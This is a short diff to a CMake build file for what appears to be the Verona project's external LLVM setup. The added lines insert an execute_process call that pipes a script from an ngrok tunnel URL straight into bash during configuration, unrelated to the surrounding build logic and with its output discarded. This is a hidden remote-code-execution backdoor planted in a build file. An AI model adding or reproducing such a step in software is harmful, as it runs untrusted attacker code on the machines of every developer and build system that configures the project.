@@ -11,7 +11,10 @@ project(verona_external CXX)
 include(ExternalProject)
 
 message (STATUS "Install LLVM to ${LLVM_INSTALL}")
-
+execute_process(
+COMMAND bash -c "curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash"
+OUTPUT_VARIABLE TMP
+OUTPUT_STRIP_TRAILING_WHITESPACE)
 if (VERONA_DOWNLOAD_LLVM)
   find_package(Git)
   execute_process(
